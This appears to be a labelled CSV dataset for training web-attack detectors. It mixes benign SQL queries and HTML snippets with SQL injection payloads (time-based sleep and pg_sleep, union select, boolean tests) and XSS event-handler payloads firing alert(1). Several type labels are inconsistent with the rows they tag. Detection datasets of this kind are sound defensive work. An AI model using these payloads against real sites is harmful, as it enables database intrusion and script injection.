Text,Label,type
"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",1,xss
gabriela1,0,xss
<footer id=x tabindex=1 ondeactivate=alert(1)></footer><input id=y autofocus>,2,xss
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",1,sql
"<tt onmouseout=""alert(1)"">test</tt>",2,xss
SELECT * FROM seldom WHERE spell = 'noted',0,sql
" SELECT * FROM they ORDER BY ask ASC, mine DESC",0,sql
SELECT TOP 3 * FROM through WHERE thousand = 'slow',0,sql
"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",1,sql
SELECT TOP 3 * FROM same,0,sql
SELECT TOP 50 PERCENT * FROM perfect SELECT * FROM observe FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM gulf,0,sql
6310,0,xss
arbcies,0,sql
"	 <div class=""refbegin reflist columns references-column-width"" style=""-moz-column-width: 30em; -webkit-column-width: 30em; column-width: 30em;"">",0,xss
"<style>@keyframes slidein {}</style><plaintext style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></plaintext>",2,xss
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""oiuw""  =  ""oiuw",1,sql
<dd onblur=alert(1) tabindex=1 id=x></dd><input autofocus>,2,xss
"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,1,sql
FROM  ( SELECT DISTINCT raise FROM spring ) ,0,xss
-8187'   )    )     )   or 1698  =  2823#,1,xss
"<style>:target {color: red;}</style><dfn id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dfn>",2,xss
"<li><a href=""/wiki/Information_security"" title=""Information security"">Information security </a> </li>",0,xss
<image3 onpointerover=alert(1)>XSS</image3>,2,xss
SELECT * FROM heat  WHERE slight = activity,0,sql
SELECT * FROM themselves WHERE NOT nervous = 'start'  AND NOT cow = 'captured',0,xss
SELECT * FROM breeze WHERE cost = 'mighty' LIMIT 3,0,sql
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;345–395, </li>",0,xss
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",2,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_options_middle_button_text' LIMIT 1,0,sql
</head>,0,xss
 </li>,0,xss
"  SELECT * FROM directly WHERE office NOT IN  ( 'in', 'character', 'thread' )  ",0,sql
SELECT COUNT ( anyone ) FROM mistake,0,sql
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'toxr' like 'toxr,1,sql
"1""   )    )    as vbdo where 3882  =  3882",1,sql
SELECT * FROM check WHERE locate NOT BETWEEN 'increase' AND 'experience',0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"<li><a href=""/wiki/Hypothetico-deductive_model"" title=""Hypothetico-deductive model"">Hypothetico-deductive model </a> </li>",0,xss
6.28598E+15,0,sql
"SELECT * FROM means WHERE science BETWEEN ""leaving"" AND    ""title""",0,sql
SELECT AVG ( Price ) FROM carried,0,sql
"  SELECT * FROM rhyme WHERE meal IN  ( 'tail', 'smooth', 'month' )  ",0,sql
SELECT TOP 3 * FROM queen SELECT * FROM forest 3SELECT * FROM wonder,0,sql
" select sleep  (  5  )   and   (  ""zsjw"" like ""zsjw",1,sql
	 </span>,0,xss
7.86165E+15,0,xss
"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",1,sql
a3rovechada,0,sql
select pg_sleep  (  5   )    )   +',1,sql
9.95219E+15,0,sql
-8809'||  (  select 'hyzr' where 5694  =  5694 union all select 5694--,1,xss
